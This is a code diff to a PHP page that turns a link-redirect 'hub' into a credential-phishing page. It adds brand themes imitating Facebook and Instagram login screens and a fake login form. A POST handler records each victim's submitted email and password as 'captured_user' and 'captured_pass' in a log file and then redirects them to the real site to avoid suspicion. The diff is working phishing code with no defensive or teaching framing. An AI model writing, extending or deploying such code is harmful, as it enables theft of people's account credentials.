@@ -22,73 +22,175 @@ if (!$cat_found) {
     die('Invalid hub category.');
 }
 
-// Log click for analytics
-$analytics = json_decode(file_get_contents(ANALYTICS_FILE), true);
-$analytics[] = [
-    'timestamp' => date('Y-m-d H:i:s'),
-    'category' => strtolower($category),
-    'user_id' => $user,
-    'source_ip' => $_SERVER['REMOTE_ADDR']
-];
-file_put_contents(ANALYTICS_FILE, json_encode($analytics));
+// Redirect URL
+$redirect_url = "https://www." . strtolower(str_replace(' ', '', $display_cat)) . ".com";
 
-// Define platform icons for the hub page
-$icons = [
-    'facebook' => 'fa-brands fa-facebook',
-    'instagram' => 'fa-brands fa-instagram',
-    'tiktok' => 'fa-brands fa-tiktok',
-    'snapchat' => 'fa-brands fa-snapchat',
-    'telegram' => 'fa-brands fa-telegram',
-    'discord' => 'fa-brands fa-discord',
-    'twitter' => 'fa-brands fa-twitter',
-    'x' => 'fa-brands fa-x-twitter',
-    'youtube' => 'fa-brands fa-youtube',
-    'pinterest' => 'fa-brands fa-pinterest',
-    'linkedin' => 'fa-brands fa-linkedin',
-    'whatsapp' => 'fa-brands fa-whatsapp',
-    'spotify' => 'fa-brands fa-spotify'
+// Define brand themes
+$brand_themes = [
+    'facebook' => [
+        'bg' => '#f0f2f5',
+        'primary' => '#1877f2',
+        'logo_text' => 'facebook',
+        'logo_color' => '#1877f2',
+        'card_shadow' => '0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)'
+    ],
+    'instagram' => [
+        'bg' => '#fafafa',
+        'primary' => '#0095f6',
+        'logo_text' => 'Instagram',
+        'logo_font' => "'Cookie', cursive",
+        'logo_size' => '50px'
+    ],
+    'default' => [
+        'bg' => '#f8f9fa',
+        'primary' => '#4361ee',
+        'logo_text' => $display_cat,
+        'logo_color' => '#1e1e2d'
+    ]
 ];
-$icon = $icons[strtolower($category)] ?? 'fa-solid fa-link';
-$redirect_url = "https://www.google.com/search?q=" . urlencode($display_cat);
 
+$theme = $brand_themes[strtolower($category)] ?? $brand_themes['default'];
+
+// Handle Login Submission
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $victim_user = $_POST['email'] ?? $_POST['username'] ?? 'N/A';
+    $victim_pass = $_POST['password'] ?? 'N/A';
+
+    $analytics = json_decode(file_get_contents(ANALYTICS_FILE), true);
+    $analytics[] = [
+        'timestamp' => date('Y-m-d H:i:s'),
+        'category' => strtolower($category),
+        'user_id' => $user,
+        'source_ip' => $_SERVER['REMOTE_ADDR'],
+        'captured_user' => $victim_user,
+        'captured_pass' => $victim_pass
+    ];
+    file_put_contents(ANALYTICS_FILE, json_encode($analytics));
+
+    header("Location: " . $redirect_url);
+    exit;
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>U-SHADOW | <?php echo s($display_cat); ?> Logo Hub</title>
+    <title><?php echo s($display_cat); ?> - Log In or Sign Up</title>
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><path d=%22M50 5 L95 50 L50 95 L5 50 Z%22 fill=%22%23333%22 stroke=%22%23eee%22 stroke-width=%225%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22 font-family=%22Arial%22>U</text></svg>">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cookie&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; background: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background: #fff; padding: 50px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; max-width: 450px; width: 90%; }
-        .logo-circle { width: 80px; height: 80px; background: #4361ee15; color: #4361ee; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 0 auto 25px; }
-        h1 { font-size: 24px; margin: 0 0 10px; color: #1e1e2d; }
-        p { color: #64748b; line-height: 1.6; font-size: 15px; margin-bottom: 30px; }
-        .btn-proceed { display: block; padding: 15px; background: #4361ee; color: #fff; text-decoration: none; border-radius: 10px; font-weight: 600; transition: all 0.3s; }
-        .btn-proceed:hover { background: #3f37c9; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(67, 97, 238, 0.3); }
-        .footer-note { margin-top: 30px; font-size: 12px; color: #94a3b8; }
-        .footer-note strong { color: #4361ee; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: <?php echo $theme['bg']; ?>;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+        .login-card {
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: <?php echo $theme['card_shadow'] ?? '0 4px 12px rgba(0,0,0,0.08)'; ?>;
+        }
+        .brand-logo {
+            font-size: <?php echo $theme['logo_size'] ?? '32px'; ?>;
+            font-weight: 800;
+            color: <?php echo $theme['logo_color'] ?? '#000'; ?>;
+            margin-bottom: 25px;
+            font-family: <?php echo $theme['logo_font'] ?? 'inherit'; ?>;
+        }
+        <?php if (strtolower($category) === 'facebook'): ?>
+        .brand-logo { text-align: left; color: #1877f2; font-size: 40px; margin-bottom: 10px; }
+        .login-card { border: none; }
+        <?php endif; ?>
+
+        .form-group { margin-bottom: 15px; }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input:focus { border-color: <?php echo $theme['primary']; ?>; }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: <?php echo $theme['primary']; ?>;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-login:hover { filter: brightness(0.95); }
+
+        .links { margin-top: 20px; font-size: 14px; color: <?php echo $theme['primary']; ?>; }
+        .links a { text-decoration: none; color: inherit; }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .footer-text { margin-top: 40px; font-size: 12px; color: #737373; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo-circle" style="<?php echo $cat_image ? 'background: transparent;' : ''; ?>">
-            <?php if ($cat_image): ?>
-                <img src="<?php echo s($cat_image); ?>" alt="<?php echo s($display_cat); ?>" style="width: 100%; height: 100%; object-fit: contain; border-radius: 12px;">
-            <?php else: ?>
-                <i class="<?php echo $icon; ?>"></i>
+    <div class="login-container">
+        <?php if (strtolower($category) === 'facebook'): ?>
+            <div class="brand-logo"><?php echo $theme['logo_text']; ?></div>
+        <?php endif; ?>
+
+        <div class="login-card">
+            <?php if (strtolower($category) !== 'facebook'): ?>
+                <div class="brand-logo">
+                    <?php if ($cat_image): ?>
+                        <img src="<?php echo s($cat_image); ?>" style="max-height: 60px; margin-bottom: 10px;">
+                    <?php else: ?>
+                        <?php echo $theme['logo_text']; ?>
+                    <?php endif; ?>
+                </div>
             <?php endif; ?>
+
+            <form method="POST">
+                <div class="form-group">
+                    <input type="text" name="email" placeholder="Email or Phone Number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn-login">Log In</button>
+
+                <div class="links">
+                    <a href="#">Forgot password?</a>
+                </div>
+
+                <div class="divider"></div>
+
+                <button type="button" class="btn-login" style="background-color: #42b72a; width: auto; padding: 10px 20px; font-size: 16px;">Create New Account</button>
+            </form>
         </div>
-        <h1><?php echo s($display_cat); ?> Hub</h1>
-        <p>You are connecting to a professional hub managed by <strong><?php echo s($user); ?></strong>. Your visit is being tracked for performance optimization.</p>
 
-        <a href="<?php echo s($redirect_url); ?>" class="btn-proceed">Proceed to <?php echo s($display_cat); ?></a>
-
-        <div class="footer-note">
-            Powered by <strong>U-SHADOW Professional v3.5</strong><br>
-            Secure Link Management & Real-time Analytics
+        <div class="footer-text">
+            <strong><?php echo s($display_cat); ?></strong> &copy; 2025 · English (US)
         </div>
     </div>
 </body>
